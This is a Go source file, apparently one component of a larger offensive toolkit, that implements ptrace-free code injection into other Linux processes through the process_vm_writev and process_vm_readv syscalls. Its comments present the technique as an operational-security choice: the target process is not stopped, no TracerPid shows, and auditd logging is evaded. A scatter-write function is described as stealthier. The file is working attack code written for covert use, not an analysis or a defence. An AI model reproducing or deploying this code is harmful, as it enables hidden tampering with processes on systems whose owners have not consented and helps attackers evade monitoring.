package stealth

// process_vm_writev Injection — Ptrace-Free Cross-Process Memory Write
//
// OPSEC rationale: The traditional way to inject code into another process
// is ptrace (PTRACE_ATTACH → PTRACE_POKEDATA). This is highly visible:
//   - /proc/[pid]/status shows TracerPid
//   - auditd logs PTRACE_ATTACH events
//   - The target process is stopped during injection
//
// process_vm_writev() (syscall 311) writes directly into another process's
// address space WITHOUT ptrace attachment. The target is never stopped,
// no TracerPid appears, and standard auditd rules don't cover this syscall.
//
// process_vm_readv() (syscall 310) reads from another process's memory,
// also without ptrace. Useful for reading target memory before injection.
//
// Capability required: CAP_SYS_PTRACE or same UID as target
// Kernel requirement: 3.2+
//
// Detection surface:
//   - Rare auditd rules on process_vm_writev (almost nobody monitors this)
//   - Memory integrity checks on the target process (runtime code verification)
//   - The seccomp filter in seccomp_notif.go blocks this syscall targeting us

import (
	"fmt"
	"syscall"
	"unsafe"
)

// syscall numbers (x86_64)
const (
	sysProcessVMReadv  = 310
	sysProcessVMWritev = 311
)

// VMWrite writes data into a target process's memory at the given address.
// The target process is NOT stopped or interrupted during the write.
// No ptrace attachment occurs — no TracerPid in /proc/[pid]/status.
func VMWrite(pid int, remoteAddr uintptr, data []byte) error {
	if len(data) == 0 {
		return nil
	}

	// Local iovec: our data buffer
	localIov := syscall.Iovec{
		Base: &data[0],
		Len:  uint64(len(data)),
	}

	// Remote iovec: target process address
	remoteIov := remoteIovec{
		Base: uint64(remoteAddr),
		Len:  uint64(len(data)),
	}

	_, _, errno := syscall.Syscall6(
		sysProcessVMWritev,
		uintptr(pid),
		uintptr(unsafe.Pointer(&localIov)),
		1, // local iovec count
		uintptr(unsafe.Pointer(&remoteIov)),
		1, // remote iovec count
		0, // flags (must be 0)
	)
	if errno != 0 {
		return fmt.Errorf("process_vm_writev pid=%d addr=0x%x: %v", pid, remoteAddr, errno)
	}

	return nil
}

// VMRead reads data from a target process's memory at the given address.
// No ptrace attachment — invisible to /proc/[pid]/status monitoring.
func VMRead(pid int, remoteAddr uintptr, length int) ([]byte, error) {
	if length == 0 {
		return nil, nil
	}

	buf := make([]byte, length)

	// Local iovec: our receive buffer
	localIov := syscall.Iovec{
		Base: &buf[0],
		Len:  uint64(length),
	}

	// Remote iovec: target process address
	remoteIov := remoteIovec{
		Base: uint64(remoteAddr),
		Len:  uint64(length),
	}

	n, _, errno := syscall.Syscall6(
		sysProcessVMReadv,
		uintptr(pid),
		uintptr(unsafe.Pointer(&localIov)),
		1,
		uintptr(unsafe.Pointer(&remoteIov)),
		1,
		0,
	)
	if errno != 0 {
		return nil, fmt.Errorf("process_vm_readv pid=%d addr=0x%x: %v", pid, remoteAddr, errno)
	}

	return buf[:n], nil
}

// VMWriteScatter writes multiple data chunks to multiple remote addresses
// in a single syscall. More efficient and stealthier than multiple calls.
func VMWriteScatter(pid int, writes []VMWriteEntry) error {
	if len(writes) == 0 {
		return nil
	}

	var localIovs []syscall.Iovec
	var remoteIovs []remoteIovec

	for _, w := range writes {
		if len(w.Data) == 0 {
			continue
		}
		localIovs = append(localIovs, syscall.Iovec{
			Base: &w.Data[0],
			Len:  uint64(len(w.Data)),
		})
		remoteIovs = append(remoteIovs, remoteIovec{
			Base: uint64(w.RemoteAddr),
			Len:  uint64(len(w.Data)),
		})
	}

	if len(localIovs) == 0 {
		return nil
	}

	_, _, errno := syscall.Syscall6(
		sysProcessVMWritev,
		uintptr(pid),
		uintptr(unsafe.Pointer(&localIovs[0])),
		uintptr(len(localIovs)),
		uintptr(unsafe.Pointer(&remoteIovs[0])),
		uintptr(len(remoteIovs)),
		0,
	)
	if errno != 0 {
		return fmt.Errorf("process_vm_writev scatter pid=%d: %v", pid, errno)
	}

	return nil
}

// VMWriteEntry describes a single write operation for scatter writes.
type VMWriteEntry struct {
	RemoteAddr uintptr
	Data       []byte
}

// remoteIovec matches the kernel's struct iovec for remote operations.
// On x86_64: base is uint64, len is uint64.
type remoteIovec struct {
	Base uint64
	Len  uint64
}

// VMWriteAvailable checks if process_vm_writev is available by testing
// a read of our own memory (which should always succeed).
func VMWriteAvailable() bool {
	testData := []byte{0x41}

	buf := make([]byte, 1)
	localIov := syscall.Iovec{
		Base: &buf[0],
		Len:  1,
	}

	remoteIov := remoteIovec{
		Base: uint64(uintptr(unsafe.Pointer(&testData[0]))),
		Len:  1,
	}

	_, _, errno := syscall.Syscall6(
		sysProcessVMReadv,
		uintptr(syscall.Getpid()),
		uintptr(unsafe.Pointer(&localIov)),
		1,
		uintptr(unsafe.Pointer(&remoteIov)),
		1,
		0,
	)
	return errno == 0
}
